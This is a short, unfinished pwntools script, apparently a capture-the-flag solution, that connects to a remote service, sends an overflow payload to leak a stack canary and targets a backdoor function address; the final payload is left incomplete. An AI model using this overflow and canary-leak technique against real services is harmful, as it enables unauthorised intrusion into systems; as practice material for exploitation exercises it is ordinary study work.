from pwn import *
context(arch='i386',os='linux',log_level='debug')
p=remote("39.96.193.120",10018)
elf=ELF('./attachment-5')

back_door=0x80491C6

payload=b'a'*(0x70-0xc+1)
p.sendlineafter("Hello Hacker!",payload)
# p.recv(payload)
canary=p.recvline()
log.info(canary)



payload=flat([
    b'a'*(1),
    
])
